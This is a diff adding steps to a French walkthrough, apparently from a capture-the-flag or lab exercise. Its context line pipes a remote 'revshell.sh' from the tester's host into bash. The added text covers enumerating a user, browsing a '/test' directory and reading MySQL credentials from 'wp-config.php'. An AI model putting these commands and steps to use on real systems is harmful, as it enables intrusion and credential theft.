@@ -141,3 +141,19 @@ curl 10.10.12.49:8000/revshell.sh | bash
 On a donc réussi à avoir le shell.
 
 ![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746710367088/77189810-6950-489b-8dff-8dd943b040c2.png align="center")
+
+On peut voir ici qu’il y a un utilisateur du nom de `scamsite`.
+
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746712841987/cadd4b0f-eb15-4599-b669-b339e5f5e545.png align="center")
+
+Le fameux répertoire `/test` sort aussi des fichiers assez bizzares
+
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746712954724/a93f4b00-487f-4bfa-acd5-fb68f62b2c67.png align="center")
+
+Dans le répertoire `/wordpress`, on voit un fichier `wp-config.php`.
+
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746713013198/f3a5307b-0270-4d1e-a984-1897653a5eaf.png align="center")
+
+Bingo, dans ce fichier, on a des identifiants MySQL.
+
+![](https://cdn.hashnode.com/res/hashnode/image/upload/v1746713095613/0e03a28e-a281-4c75-a10e-b5dfbef2c268.png align="center")
